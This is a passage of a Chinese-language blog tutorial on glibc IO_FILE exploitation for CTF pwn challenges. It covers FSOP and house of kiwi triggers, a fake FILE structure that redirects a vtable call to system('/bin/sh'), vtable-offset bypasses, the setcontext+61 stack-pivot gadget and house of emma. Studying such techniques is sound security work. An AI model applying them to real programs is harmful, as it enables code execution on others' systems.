class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意，程序中存在很多<code>_IO_jump_t</code>结构体，不同的<code>_IO_FILE_plus</code>可能采用不同的<code>_IO_jump_t</code>，例如stdin&#x2F;stdout&#x2F;stderr使用<code>_IO_file_jumps</code>，可以通过gdb查看</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811182023451.png" alt="image-20230811182023451"></p>
<h1 id="FSOP基础"><a href="#FSOP基础" class="headerlink" title="FSOP基础"></a>FSOP基础</h1><p><strong>FSOP</strong>(File Stream Oriented Programming是针对<code>_IO_FILE</code>结构体与IO操作的攻击方式</p>
<p>通常可以分为两个步骤：<strong>劫持</strong>并<strong>伪造</strong>IO结构体、<strong>触发</strong>IO流</p>
<p>因为触发IO流的方式影响程序进入的IO结构体，所以我们先讲如何触发IO流</p>
<h2 id="触发IO流"><a href="#触发IO流" class="headerlink" title="触发IO流"></a>触发IO流</h2><p>触发IO流的方式主要分为两种：<strong>FSOP</strong>的经典方式和<strong>house of kiwi</strong>的方式</p>
<h3 id="FSOP-IO-flush-all-lockp"><a href="#FSOP-IO-flush-all-lockp" class="headerlink" title="FSOP - _IO_flush_all_lockp()"></a>FSOP - _IO_flush_all_lockp()</h3><p>该函数的调用有以下三种触发方式：</p>
<ol>
<li><code>libc</code>检测到<strong>内存错误</strong>，从而执行<code>abort</code>函数时（在<code>glibc-2.26</code>删除）</li>
<li>程序执行<code>exit</code>函数</li>
<li>程序从main函数返回（同样是执行exit）</li>
</ol>
<p>可以看到，高版本下，基本的触发方式都是通过<code>exit</code>函数，其栈回溯为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br></pre></td></tr></table></figure>

<p>就能调用到<code>_IO_flush_all_lockp()</code>函数</p>
<p>该函数的代码片段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在经历一系列条件判断后，程序会调用虚表中的<code>_IO_OVERFLOW</code> 函数，而虚表指针是可以由我们伪造的。所以合理布局，触发该函数，就能进入我们伪造的执行流。</p>
<p>下面讲如何达成调用<code>_IO_OVERFLOW</code>函数的条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>

<p>根据短路原则，执行<code>_IO_OVERFLOW</code>需要满足前面的条件为真，这里有一个或语句，故有两种达成条件，满足任一即可：</p>
<p>1.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p>
<p>   这是较为常用的达成条件，只需伪造<code>_IO_FILE</code>中的<code>_IO_write_ptr</code>、<code>_IO_write_base</code>和<code>_mode</code>即可达成</p>
<p>2.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p>
<p>   该条件可以结合<strong>house of cat</strong>使用。其中<code>_IO_vtable_offset (fp) == 0</code> 即 <code>_vtable_offset</code>为0，另外需要关注<code>_wide_data</code>结构体，该手法会在house of cat中讲解</p>
<p>条件满足后，会从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历FILE结构体，执行对应虚表中的<code>_IO_OVERFLOW</code>，即<code>&lt;_IO_file_jumps+24&gt;</code></p>
<h3 id="house-of-kiwi-malloc-assert"><a href="#house-of-kiwi-malloc-assert" class="headerlink" title="house of kiwi - __malloc_assert"></a>house of kiwi - __malloc_assert</h3><p>该手法用于在程序无<code>exit</code>时触发IO，且能控制<code>rdx</code></p>
<p>以下为<code>__malloc_assert</code>的代码片段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数调用的<code>__fxprintf</code>、<code>fflush</code>都能调用虚表中函数，有劫持的可能。</p>
<p>以下是进入<code>__malloc_assert</code>的方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>不满足以下条件任一即可进入：</p>
<ol>
<li><code>old_size &gt;=MINSIZE</code></li>
<li><code>old_top.pre_inuse = 0</code></li>
<li><code>old_top页对齐</code></li>
</ol>
<p>通常用的比较多的是第三种，因为页对齐条件较苛刻，通常修改topchunk的size都能不对齐。注意<strong>不能改的太大</strong>，否则会进入别的assert。这里修改的方式一般是构造<strong>堆重叠</strong>或<strong>largebin attack</strong></p>
<p>接下来讲函数的调用链，这里分<code>__fxprintf</code>和<code>fflush</code>两种方式</p>
<h4 id="fxprintf"><a href="#fxprintf" class="headerlink" title="__fxprintf"></a>__fxprintf</h4><p>调用链为</p>
<p><code>__fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn </code></p>
<p>需要满足的条件为：</p>
<ol>
<li><code>_IO_write_ptr</code> &gt; <code>_IO_write_base</code></li>
<li><code>_lock</code>指向可写地址</li>
</ol>
<p>调用后，仅刷新<code>stderr</code>，调用虚表<code>_IO_file_jumps</code>中的<code>_IO_new_file_xsputn</code>，即<code>&lt;_IO_file_jumps+56&gt;</code></p>
<h4 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h4><p><code>fflush(stderr) =&gt; _IO_file_jumps =&gt; sync</code></p>
<p>用的比较少，没什么条件。但是因为在<code>__fxprinf</code>之后，所以需要保证<code>__fxprinf</code>不会挂掉。</p>
<p>好处是通过这条调用链，在调用<code>sync</code>时的<code>rdx</code>固定，都是<code>IO_helper_jumps</code>，可以结合后面讲到的<code>&lt;setcontext+61&gt;</code>利用。不过高版本中加入虚表检测，这种利用变得困难</p>
<h2 id="伪造FILE结构体"><a href="#伪造FILE结构体" class="headerlink" title="伪造FILE结构体"></a>伪造FILE结构体</h2><p>如何让我们伪造的FILE结构体在触发IO时被刷新？</p>
<p>如果使用<strong>FSOP</strong>的方式，程序从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历。故我们可以修改<code>_IO_list_all</code>指针，指向我们伪造的结构体，如果使用largebin attack就可以一步到位指向布置在chunk上的伪造结构体。同时还可以修改<code>_chain</code>指针，劫持到多个伪造的结构体的利用链</p>
<p>如果使用<strong>house of kiwi</strong>的方式，程序仅刷新<code>stderr</code>，可以修改<code>stderr</code>指针（如果可写），甚至直接修改<code>_IO_2_1_stderr</code>的内容</p>
<p>伪造FILE的手法繁多，这里举出最原始的一种手法作为例子</p>
<h3 id="上古时期的FSOP-Glibc"><a href="#上古时期的FSOP-Glibc" class="headerlink" title="上古时期的FSOP(Glibc&lt;2.24)"></a>上古时期的FSOP(Glibc&lt;2.24)</h3><p>因为触发FSOP时，会调用虚表中<code>&lt;_IO_file_jumps+24&gt;</code>处的<code>__overflow</code>函数，我们只需把该位置填入<code>system</code>的地址。当然，虚表不可写，我们可以将<code>vtable</code>处改为我们伪造的虚表。同时此时的<code>rdi</code>指向FILE结构体的<code>_flags</code>，所以可以将该位置填上<code>/bin/sh</code></p>
<p>构造方式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr1</span><br><span class="line">chunk_addr1</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = chunk_addr2</span><br><span class="line">&#125;</span><br><span class="line">chunk_addr2</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>干净又卫生</p>
<h3 id="虚表偏移时代-Glibc-2-24"><a href="#虚表偏移时代-Glibc-2-24" class="headerlink" title="虚表偏移时代(Glibc&gt;&#x3D;2.24)"></a>虚表偏移时代(Glibc&gt;&#x3D;2.24)</h3><p>加入了对虚表的检查<code>IO_validate_vtable()</code>与<code>IO_vtable_check()</code>，若无法通过检查，则会报错：<code>Fatal error: glibc detected an invalid stdio handle</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>glibc中有一段完整的内存存放着各个<code>vtable</code>，其中<code>__start___libc_IO_vtables</code>指向第一个<code>vtable</code>地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个<code>vtable</code> <code>_IO_str_chk_jumps</code>结束的地址。若指针不在glibc的<code>vtable</code>段，会调用<code>_IO_vtable_check()</code>做进一步检查，以判断程序是否使用了外部合法的<code>vtable</code>（重构或是动态链接库中的<code>vtable</code>），如果不是则报错。</p>
<p>2.37以前有以下虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure>

<p>从此，虚表指针不能随意伪造了。好在这个检测依旧比较宽泛，我们依旧可以修改<code>vtable</code>为虚表内的其他指针，通过一定的<strong>偏移</strong>调用<strong>其他虚表</strong>内的函数</p>
<p>例如，原本house of kiwi会触发<code>&lt;_IO_file_jumps+56&gt;</code>处的<code>_IO_new_file_xsputn</code>函数，我们希望调用<code>&lt;_IO_cookie_jumps+120&gt;</code>处的<code>_IO_cookie_write</code>函数。原本<code>vtable</code>指向<code>_IO_file_jumps</code>，调用函数时则会将指针加上56。我们把<code>vtable</code>设置为<code>&lt;_IO_cookie_jumps+64&gt;</code>，那么在实际调用时，就会调用到<code>&lt;_IO_cookie_jumps+64+56&gt;</code>处的目标函数。这就是<strong>虚表偏移</strong>的思想，将执行流劫持到已有的函数上。</p>
<h1 id="新时代的高版本IOFILE利用"><a href="#新时代的高版本IOFILE利用" class="headerlink" title="新时代的高版本IOFILE利用"></a>新时代的高版本IOFILE利用</h1><p>高版本下的IOFILE利用方式很多，但大多不外乎都是利用<strong>虚表偏移</strong>的思想伪造FILE结构体，并通过以上的方式<strong>触发IO</strong>，从而getshell或者orw</p>
<p>这里介绍几种<del>我会的</del>比较好用的</p>
<h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>相较于他的实战意义，kiwi更大的价值可能在于它的两条思路，一条是上文提到的<code>__malloc_assert</code>触发IO，另一条则是<code>setcontext&lt;+61&gt;</code></p>
<p>这是一个函数的片段，兼具<strong>布置寄存器、栈迁移</strong>的功能，常常在沙盒限制<code>execve</code>的情况下用来打<strong>orw链</strong>，汇编代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;#基本上都能跳</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret	</span><br></pre></td></tr></table></figure>

<p>围绕<code>rdx</code>进行参数的布置，就能设置好各个寄存器</p>
<p>这里最重要的两条是</p>
<p><code>[rdx+0xa0]</code> &#x3D;&gt; <code>rsp</code></p>
<p><code>[rdx+0xa8]</code> &#x3D;&gt; <code>rcx</code> &#x3D;&gt; <code>ret</code></p>
<p>我们通常将<code>rcx</code>布置为<code>ret</code>的gadget，这样在最后<code>ret</code>的时候就能实现栈迁移到赋给<code>rsp</code>的地址上</p>
<h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>可以理解为kiwi衍生出的攻击手法，需要以下三个条件</p>
<ol>
<li><p>可以<strong>任意写</strong>一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</p>
</li>
<li><p>一次<strong>任意地址读</strong> 或 再来一次<strong>任意写</strong></p>
</li>
<li><p>可以<strong>触发 IO 流</strong>（FSOP、house of kiwi）</p>
</li>
</ol>
<p>利用的虚表为<code>_IO_cookie_jumps</code>，存在拓展结构<code>_IO_cookie_file</code>（还是<code>_IO_FILE_plus</code>加长版），多了一个函数表，存在劫持的可能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure>

<p>需要调用的虚表函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span 